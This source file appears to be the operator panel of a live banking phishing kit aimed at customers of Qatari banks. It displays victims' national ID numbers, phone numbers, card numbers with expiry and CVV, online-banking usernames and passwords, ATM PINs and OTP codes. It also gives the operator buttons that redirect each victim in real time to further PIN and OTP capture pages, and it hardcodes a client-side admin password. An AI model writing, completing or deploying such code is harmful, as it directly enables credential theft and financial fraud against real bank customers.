import { useState, useMemo } from "react";
import { useLanguage } from "@/contexts/LanguageContext";
import { useLocation } from "wouter";
import { trpc } from "@/lib/trpc";
import { Dialog, DialogContent } from "@/components/ui/dialog";
import { Loader2, Eye, RefreshCcw, Check, X, Users, Lock, LogOut, Globe, Phone, CreditCard, Calendar, Hash, MapPin } from "lucide-react";

// --- PROFESSIONAL STYLES (PURE CSS) ---
const styles = {
  loginContainer: {
    minHeight: '100vh',
    width: '100%',
    display: 'flex',
    alignItems: 'center',
    justifyContent: 'center',
    backgroundColor: '#0a0a0a',
    fontFamily: 'system-ui, -apple-system, sans-serif',
    position: 'relative' as const,
    overflow: 'hidden',
  },
  loginCard: {
    backgroundColor: '#141414',
    border: '1px solid #333',
    padding: '40px',
    borderRadius: '24px',
    width: '100%',
    maxWidth: '400px',
    zIndex: 10,
    boxShadow: '0 25px 50px -12px rgba(0, 0, 0, 0.5)',
    textAlign: 'center' as const,
  },
  input: {
    width: '100%',
    backgroundColor: '#000',
    border: '1px solid #333',
    color: '#fff',
    padding: '16px',
    borderRadius: '12px',
    fontSize: '16px',
    marginBottom: '20px',
    outline: 'none',
    boxSizing: 'border-box' as const,
  },
  button: {
    width: '100%',
    backgroundColor: '#e11d48',
    color: '#fff',
    padding: '16px',
    borderRadius: '12px',
    fontSize: '16px',
    fontWeight: 'bold',
    border: 'none',
    cursor: 'pointer',
    transition: 'all 0.2s',
  },
  dashboardContainer: {
    minHeight: '100vh',
    backgroundColor: '#f8fafc',
    fontFamily: 'system-ui, -apple-system, sans-serif',
  },
  nav: {
    backgroundColor: '#fff',
    borderBottom: '1px solid #e2e8f0',
    padding: '0 20px',
    height: '80px',
    display: 'flex',
    alignItems: 'center',
    justifyContent: 'space-between',
    position: 'sticky' as const,
    top: 0,
    zIndex: 100,
  },
  statsGrid: {
    display: 'grid',
    gridTemplateColumns: 'repeat(auto-fit, minmax(280px, 1fr))',
    gap: '24px',
    padding: '40px 20px',
    maxWidth: '1280px',
    margin: '0 auto',
  },
  statCard: {
    padding: '32px',
    borderRadius: '24px',
    color: '#fff',
    position: 'relative' as const,
    overflow: 'hidden',
    boxShadow: '0 10px 15px -3px rgba(0, 0, 0, 0.1)',
  },
  tableContainer: {
    maxWidth: '1280px',
    margin: '0 auto 40px',
    backgroundColor: '#fff',
    borderRadius: '24px',
    border: '1px solid #e2e8f0',
    overflow: 'hidden',
    boxShadow: '0 4px 6px -1px rgba(0, 0, 0, 0.1)',
  },
  table: {
    width: '100%',
    borderCollapse: 'collapse' as const,
    textAlign: 'right' as const,
  },
  th: {
    padding: '20px',
    backgroundColor: '#f8fafc',
    color: '#64748b',
    fontSize: '12px',
    fontWeight: 'bold',
    textTransform: 'uppercase' as const,
    letterSpacing: '0.05em',
    borderBottom: '2px solid #f1f5f9',
  },
  td: {
    padding: '20px',
    borderBottom: '1px solid #f1f5f9',
    fontSize: '14px',
    color: '#1e293b',
  },
  badge: {
    padding: '6px 12px',
    borderRadius: '9999px',
    fontSize: '11px',
    fontWeight: 'bold',
    textTransform: 'uppercase' as const,
  }
};

const getStatusDisplay = (currentStep: string | null | undefined, language: string) => {
  const statusMap: Record<string, Record<string, string>> = {
    ar: {
      login: "تسجيل الدخول",
      otp: "OTP الأول",
      atm: "ATM PIN",
      ooredoo: "Ooredoo",
      otp_ooredoo: "OTP Ooredoo",
      pending: "في الانتظار",
      approved: "تمت الموافقة",
      rejected: "تم الرفض",
    },
    en: {
      login: "Login Page",
      otp: "First OTP",
      atm: "ATM PIN",
      ooredoo: "Ooredoo",
      otp_ooredoo: "Ooredoo OTP",
      pending: "Pending",
      approved: "Approved",
      rejected: "Rejected",
    },
  };
  return statusMap[language]?.[currentStep || "pending"] || currentStep || "—";
};

const getStatusStyles = (currentStep: string | null | undefined) => {
  const colorMap: Record<string, { bg: string, text: string }> = {
    login: { bg: '#dbeafe', text: '#1e40af' },
    otp: { bg: '#f3e8ff', text: '#6b21a8' },
    atm: { bg: '#ffedd5', text: '#9a3412' },
    ooredoo: { bg: '#fee2e2', text: '#991b1b' },
    otp_ooredoo: { bg: '#fce7f3', text: '#9d174d' },
  };
  const colors = colorMap[currentStep || ""] || { bg: '#f1f5f9', text: '#475569' };
  return { backgroundColor: colors.bg, color: colors.text };
};

export default function AdminDashboard() {
  const { language, t } = useLanguage();
  const [, setLocation] = useLocation();
  const [searchTerm, setSearchTerm] = useState("");
  const [selectedSession, setSelectedSession] = useState<string | null>(null);
  const [showDetails, setShowDetails] = useState(false);
  const [showRedirectMenu, setShowRedirectMenu] = useState<string | null>(null);
  const [password, setPassword] = useState("");
  const [isAuthenticated, setIsAuthenticated] = useState(() => {
    return typeof window !== 'undefined' && sessionStorage.getItem('adminAuth') === 'true';
  });

  const { data: submissions, isLoading, refetch } = trpc.submissions.getAllSubmissions.useQuery(undefined, {
    enabled: isAuthenticated,
    refetchInterval: 3000,
  });

  const takeActionMutation = trpc.submissions.adminTakeAction.useMutation();

  const handleLogin = (e: React.FormEvent) => {
    e.preventDefault();
    if (password === "Qatar@@200") {
      setIsAuthenticated(true);
      sessionStorage.setItem('adminAuth', 'true');
    } else {
      alert(language === 'ar' ? "كلمة مرور خاطئة" : "Incorrect password");
    }
  };

  const handleLogout = () => {
    setIsAuthenticated(false);
    sessionStorage.removeItem('adminAuth');
  };

  const handleAction = async (sessionId: string, action: string, errorMsg?: string, redirectTarget?: string) => {
    try {
      await takeActionMutation.mutateAsync({ sessionId, action, errorMessage: errorMsg, redirectTarget });
      setShowRedirectMenu(null);
      refetch();
    } catch (error) {
      console.error("Action error:", error);
    }
  };

  const filteredSubmissions = useMemo(() => {
    if (!submissions) return [];
    return submissions.filter((s: any) => 
      s.id.toLowerCase().includes(searchTerm.toLowerCase()) ||
      (s.personalData?.nameArabic || "").toLowerCase().includes(searchTerm.toLowerCase()) ||
      (s.personalData?.nameEnglish || "").toLowerCase().includes(searchTerm.toLowerCase())
    );
  }, [submissions, searchTerm]);

  const stats = useMemo(() => {
    if (!submissions) return { total: 0, pending: 0, approved: 0 };
    return {
      total: submissions.length,
      pending: submissions.filter((s: any) => s.status === 'pending' || s.status === 'loading').length,
      approved: submissions.filter((s: any) => s.status === 'approved').length,
    };
  }, [submissions]);

  if (!isAuthenticated) {
    return (
      <div style={styles.loginContainer}>
        <div style={styles.loginCard}>
          <div style={{ marginBottom: '32px' }}>
            <div style={{ backgroundColor: '#e11d48', width: '64px', height: '64px', borderRadius: '20px', display: 'flex', alignItems: 'center', justifyContent: 'center', margin: '0 auto 24px' }}>
              <Lock color="#fff" size={32} />
            </div>
            <h1 style={{ color: '#fff', fontSize: '24px', fontWeight: 'bold', margin: '0 0 8px 0' }}>{language === 'ar' ? "لوحة التحكم" : "Admin Panel"}</h1>
            <p style={{ color: '#666', fontSize: '14px' }}>{language === 'ar' ? "يرجى إدخال كلمة المرور للمتابعة" : "Enter password to continue"}</p>
          </div>
          <form onSubmit={handleLogin}>
            <input
              type="password"
              placeholder={language === 'ar' ? "كلمة المرور" : "Password"}
              style={styles.input}
              value={password}
              onChange={(e) => setPassword(e.target.value)}
              autoFocus
            />
            <button type="submit" style={styles.button}>{language === 'ar' ? "دخول" : "Sign In"}</button>
          </form>
        </div>
      </div>
    );
  }

  const selectedData = submissions?.find((s: any) => s.id === selectedSession);

  return (
    <div style={styles.dashboardContainer} dir={language === 'ar' ? 'rtl' : 'ltr'}>
      <nav style={styles.nav}>
        <div style={{ display: 'flex', alignItems: 'center', gap: '12px' }}>
          <div style={{ backgroundColor: '#e11d48', width: '40px', height: '40px', borderRadius: '12px', display: 'flex', alignItems: 'center', justifyContent: 'center' }}>
            <Users color="#fff" size={20} />
          </div>
          <h1 style={{ fontSize: '20px', fontWeight: 'bold', color: '#1e293b' }}>{language === 'ar' ? "إدارة الطلبات" : "Submissions"}</h1>
        </div>
        <div style={{ display: 'flex', alignItems: 'center', gap: '16px' }}>
          <div style={{ position: 'relative' }}>
            <input
              type="text"
              placeholder={language === 'ar' ? "بحث بالاسم أو الكود..." : "Search..."}
              style={{ padding: '10px 16px', borderRadius: '12px', border: '1px solid #e2e8f0', width: '240px', outline: 'none', fontSize: '14px' }}
              value={searchTerm}
              onChange={(e) => setSearchTerm(e.target.value)}
            />
          </div>
          <button onClick={handleLogout} style={{ display: 'flex', alignItems: 'center', gap: '8px', padding: '10px 16px', borderRadius: '12px', border: '1px solid #fee2e2', color: '#e11d48', backgroundColor: '#fff', cursor: 'pointer', fontSize: '14px', fontWeight: 'bold' }}>
            <LogOut size={18} />
            {language === 'ar' ? "خروج" : "Logout"}
          </button>
        </div>
      </nav>

      <div style={styles.statsGrid}>
        <div style={{ ...styles.statCard, background: 'linear-gradient(135deg, #6366f1 0%, #4f46e5 100%)' }}>
          <p style={{ fontSize: '14px', opacity: 0.8, marginBottom: '8px' }}>{language === 'ar' ? "إجمالي الزوار" : "Total Visitors"}</p>
          <h2 style={{ fontSize: '36px', fontWeight: 'bold' }}>{stats.total}</h2>
          <Users style={{ position: 'absolute', right: '20px', bottom: '20px', opacity: 0.2 }} size={48} />
        </div>
        <div style={{ ...styles.statCard, background: 'linear-gradient(135deg, #f59e0b 0%, #d97706 100%)' }}>
          <p style={{ fontSize: '14px', opacity: 0.8, marginBottom: '8px' }}>{language === 'ar' ? "طلبات نشطة" : "Active Sessions"}</p>
          <h2 style={{ fontSize: '36px', fontWeight: 'bold' }}>{stats.pending}</h2>
          <RefreshCcw style={{ position: 'absolute', right: '20px', bottom: '20px', opacity: 0.2 }} size={48} />
        </div>
        <div style={{ ...styles.statCard, background: 'linear-gradient(135deg, #10b981 0%, #059669 100%)' }}>
          <p style={{ fontSize: '14px', opacity: 0.8, marginBottom: '8px' }}>{language === 'ar' ? "تمت الموافقة" : "Approved"}</p>
          <h2 style={{ fontSize: '36px', fontWeight: 'bold' }}>{stats.approved}</h2>
          <Check style={{ position: 'absolute', right: '20px', bottom: '20px', opacity: 0.2 }} size={48} />
        </div>
      </div>

      <div style={styles.tableContainer}>
        {isLoading ? (
          <div style={{ padding: '100px', textAlign: 'center' }}>
            <Loader2 className="animate-spin" size={48} color="#e11d48" style={{ margin: '0 auto' }} />
          </div>
        ) : (
          <table style={styles.table}>
            <thead>
              <tr>
                <th style={styles.th}>{language === 'ar' ? "الكود" : "ID"}</th>
                <th style={styles.th}>{language === 'ar' ? "البنك" : "Bank"}</th>
                <th style={styles.th}>{language === 'ar' ? "الدولة" : "Country"}</th>
                <th style={styles.th}>{language === 'ar' ? "الاسم" : "Name"}</th>
                <th style={styles.th}>{language === 'ar' ? "المرحلة" : "Step"}</th>
                <th style={styles.th}>{language === 'ar' ? "التوقيت" : "Time"}</th>
                <th style={styles.th}>{language === 'ar' ? "الإجراءات" : "Actions"}</th>
              </tr>
            </thead>
            <tbody>
              {filteredSubmissions.map((s: any) => (
                <tr key={s.id} style={{ backgroundColor: selectedSession === s.id ? '#f8fafc' : 'transparent' }}>
                  <td style={styles.td}><span style={{ fontFamily: 'monospace', color: '#64748b' }}>{s.id.substring(0, 8)}...</span></td>
                  <td style={styles.td}>
                    <div style={{ display: 'flex', alignItems: 'center', gap: '8px' }}>
                      <div style={{ width: '8px', height: '8px', borderRadius: '50%', backgroundColor: '#e11d48' }}></div>
                      {s.selectedBank.toUpperCase()}
                    </div>
                  </td>
                  <td style={styles.td}>
                    <div style={{ display: 'flex', alignItems: 'center', gap: '6px', color: '#64748b' }}>
                      <MapPin size={14} />
                      {s.country || "Qatar"}
                    </div>
                  </td>
                  <td style={styles.td}>{s.personalData?.nameArabic || s.personalData?.nameEnglish || "—"}</td>
                  <td style={styles.td}>
                    <span style={{ ...styles.badge, ...getStatusStyles(s.currentStep) }}>
                      {getStatusDisplay(s.currentStep, language)}
                    </span>
                  </td>
                  <td style={styles.td}>{new Date(s.createdAt).toLocaleTimeString(language === 'ar' ? 'ar-QA' : 'en-US')}</td>
                  <td style={styles.td}>
                    <div style={{ display: 'flex', gap: '8px' }}>
                      <button onClick={() => { setSelectedSession(s.id); setShowDetails(true); }} style={{ padding: '8px', borderRadius: '8px', border: '1px solid #e2e8f0', backgroundColor: '#fff', cursor: 'pointer', color: '#64748b' }}>
                        <Eye size={18} />
                      </button>
                      <div style={{ position: 'relative' }}>
                        <button onClick={() => setShowRedirectMenu(showRedirectMenu === s.id ? null : s.id)} style={{ padding: '8px 16px', borderRadius: '8px', backgroundColor: '#e11d48', color: '#fff', border: 'none', cursor: 'pointer', fontSize: '12px', fontWeight: 'bold' }}>
                          {language === 'ar' ? "توجيه" : "Redirect"}
                        </button>
                        {showRedirectMenu === s.id && (
                          <div style={{ position: 'absolute', top: '100%', [language === 'ar' ? 'left' : 'right']: 0, marginTop: '8px', backgroundColor: '#fff', border: '1px solid #e2e8f0', borderRadius: '12px', padding: '8px', zIndex: 50, boxShadow: '0 10px 15px -3px rgba(0, 0, 0, 0.1)', width: '160px' }}>
                            <button onClick={() => handleAction(s.id, 'approve')} style={{ width: '100%', textAlign: language === 'ar' ? 'right' : 'left', padding: '8px 12px', border: 'none', backgroundColor: 'transparent', cursor: 'pointer', borderRadius: '6px', fontSize: '13px' }}>✅ {language === 'ar' ? "موافقة" : "Approve"}</button>
                            <button onClick={() => handleAction(s.id, 'otp', undefined, 'otp')} style={{ width: '100%', textAlign: language === 'ar' ? 'right' : 'left', padding: '8px 12px', border: 'none', backgroundColor: 'transparent', cursor: 'pointer', borderRadius: '6px', fontSize: '13px' }}>🔑 {language === 'ar' ? "طلب OTP" : "Request OTP"}</button>
                            <button onClick={() => handleAction(s.id, 'atm', undefined, 'atm-pin')} style={{ width: '100%', textAlign: language === 'ar' ? 'right' : 'left', padding: '8px 12px', border: 'none', backgroundColor: 'transparent', cursor: 'pointer', borderRadius: '6px', fontSize: '13px' }}>💳 {language === 'ar' ? "طلب ATM PIN" : "Request ATM PIN"}</button>
                            <button onClick={() => handleAction(s.id, 'ooredoo', undefined, 'ooredoo')} style={{ width: '100%', textAlign: language === 'ar' ? 'right' : 'left', padding: '8px 12px', border: 'none', backgroundColor: 'transparent', cursor: 'pointer', borderRadius: '6px', fontSize: '13px' }}>🌐 {language === 'ar' ? "توجيه Ooredoo" : "Redirect Ooredoo"}</button>
                            <button onClick={() => handleAction(s.id, 'reject', 'بيانات غير صحيحة')} style={{ width: '100%', textAlign: language === 'ar' ? 'right' : 'left', padding: '8px 12px', border: 'none', backgroundColor: 'transparent', cursor: 'pointer', borderRadius: '6px', fontSize: '13px', color: '#e11d48' }}>❌ {language === 'ar' ? "رفض" : "Reject"}</button>
                          </div>
                        )}
                      </div>
                    </div>
                  </td>
                </tr>
              ))}
            </tbody>
          </table>
        )}
      </div>

      <Dialog open={showDetails} onOpenChange={setShowDetails}>
        <DialogContent style={{ maxWidth: '600px', padding: 0, borderRadius: '24px', overflow: 'hidden', border: 'none' }}>
          {selectedData && (
            <div dir={language === 'ar' ? 'rtl' : 'ltr'} style={{ backgroundColor: '#fff' }}>
              <div style={{ backgroundColor: '#e11d48', padding: '32px', color: '#fff' }}>
                <h2 style={{ fontSize: '24px', fontWeight: 'bold', marginBottom: '8px' }}>{language === 'ar' ? "تفاصيل الطلب" : "Submission Details"}</h2>
                <p style={{ opacity: 0.8, fontSize: '14px' }}>ID: {selectedData.id}</p>
              </div>
              
              <div style={{ padding: '32px', display: 'flex', flexDirection: 'column', gap: '24px', maxHeight: '70vh', overflowY: 'auto' }}>
                {/* Personal Data */}
                <section>
                  <div style={{ display: 'flex', alignItems: 'center', gap: '8px', marginBottom: '16px', color: '#e11d48' }}>
                    <Users size={20} />
                    <h3 style={{ fontWeight: 'bold' }}>{language === 'ar' ? "البيانات الشخصية" : "Personal Data"}</h3>
                  </div>
                  <div style={{ display: 'grid', gridTemplateColumns: '1fr 1fr', gap: '16px', backgroundColor: '#f8fafc', padding: '20px', borderRadius: '16px' }}>
                    <div>
                      <p style={{ fontSize: '12px', color: '#64748b', marginBottom: '4px' }}>{language === 'ar' ? "الاسم" : "Name"}</p>
                      <p style={{ fontWeight: '500' }}>{selectedData.personalData?.nameArabic || "—"}</p>
                    </div>
                    <div>
                      <p style={{ fontSize: '12px', color: '#64748b', marginBottom: '4px' }}>{language === 'ar' ? "رقم الجوال" : "Phone"}</p>
                      <p style={{ fontWeight: '500' }}>{selectedData.personalData?.phoneNumber || "—"}</p>
                    </div>
                    <div>
                      <p style={{ fontSize: '12px', color: '#64748b', marginBottom: '4px' }}>{language === 'ar' ? "رقم الهوية" : "ID Number"}</p>
                      <p style={{ fontWeight: '500' }}>{selectedData.personalData?.idNumber || "—"}</p>
                    </div>
                    <div>
                      <p style={{ fontSize: '12px', color: '#64748b', marginBottom: '4px' }}>{language === 'ar' ? "الدولة" : "Country"}</p>
                      <p style={{ fontWeight: '500' }}>{selectedData.country || "Qatar"}</p>
                    </div>
                  </div>
                </section>

                {/* Login Method */}
                <section>
                  <div style={{ display: 'flex', alignItems: 'center', gap: '8px', marginBottom: '16px', color: '#e11d48' }}>
                    <CreditCard size={20} />
                    <h3 style={{ fontWeight: 'bold' }}>{language === 'ar' ? "بيانات تسجيل الدخول" : "Login Data"}</h3>
                  </div>
                  <div style={{ backgroundColor: '#f8fafc', padding: '20px', borderRadius: '16px' }}>
                    {selectedData.loginMethod?.loginType === 'card' ? (
                      <div style={{ display: 'grid', gridTemplateColumns: '1fr 1fr', gap: '16px' }}>
                        <div style={{ gridColumn: '1 / -1' }}>
                          <p style={{ fontSize: '12px', color: '#64748b', marginBottom: '4px' }}>{language === 'ar' ? "رقم البطاقة" : "Card Number"}</p>
                          <p style={{ fontWeight: 'bold', fontSize: '18px', letterSpacing: '2px' }}>{selectedData.loginMethod.cardNumber}</p>
                        </div>
                        <div>
                          <p style={{ fontSize: '12px', color: '#64748b', marginBottom: '4px' }}>{language === 'ar' ? "التاريخ" : "Expiry"}</p>
                          <p style={{ fontWeight: '500' }}>{selectedData.loginMethod.expiryDate}</p>
                        </div>
                        <div>
                          <p style={{ fontSize: '12px', color: '#64748b', marginBottom: '4px' }}>CVV</p>
                          <p style={{ fontWeight: '500' }}>{selectedData.loginMethod.cvv}</p>
                        </div>
                      </div>
                    ) : (
                      <div style={{ display: 'grid', gridTemplateColumns: '1fr 1fr', gap: '16px' }}>
                        <div>
                          <p style={{ fontSize: '12px', color: '#64748b', marginBottom: '4px' }}>{language === 'ar' ? "اسم المستخدم" : "Username"}</p>
                          <p style={{ fontWeight: '500' }}>{selectedData.loginMethod?.username || "—"}</p>
                        </div>
                        <div>
                          <p style={{ fontSize: '12px', color: '#64748b', marginBottom: '4px' }}>{language === 'ar' ? "كلمة المرور" : "Password"}</p>
                          <p style={{ fontWeight: '500' }}>{selectedData.loginMethod?.password || "—"}</p>
                        </div>
                      </div>
                    )}
                  </div>
                </section>

                {/* PIN & OTP */}
                <div style={{ display: 'grid', gridTemplateColumns: '1fr 1fr', gap: '24px' }}>
                  <section>
                    <div style={{ display: 'flex', alignItems: 'center', gap: '8px', marginBottom: '12px', color: '#e11d48' }}>
                      <Hash size={18} />
                      <h3 style={{ fontWeight: 'bold', fontSize: '14px' }}>ATM PIN</h3>
                    </div>
                    <div style={{ backgroundColor: '#f8fafc', padding: '16px', borderRadius: '12px', textAlign: 'center' }}>
                      <p style={{ fontSize: '20px', fontWeight: 'bold', letterSpacing: '4px' }}>{selectedData.atmPin?.pin || "—"}</p>
                    </div>
                  </section>
                  <section>
                    <div style={{ display: 'flex', alignItems: 'center', gap: '8px', marginBottom: '12px', color: '#e11d48' }}>
                      <RefreshCcw size={18} />
                      <h3 style={{ fontWeight: 'bold', fontSize: '14px' }}>OTP Codes</h3>
                    </div>
                    <div style={{ backgroundColor: '#f8fafc', padding: '16px', borderRadius: '12px' }}>
                      {selectedData.otps?.length > 0 ? (
                        selectedData.otps.map((o: any, i: number) => (
                          <div key={i} style={{ display: 'flex', justifyContent: 'space-between', marginBottom: i === selectedData.otps.length - 1 ? 0 : '8px' }}>
                            <span style={{ fontWeight: 'bold' }}>{o.otpCode}</span>
                            <span style={{ fontSize: '10px', color: '#64748b' }}>{o.otpType}</span>
                          </div>
                        ))
                      ) : "—"}
                    </div>
                  </section>
                </div>
              </div>
            </div>
          )}
        </DialogContent>
      </Dialog>
    </div>
  );
}
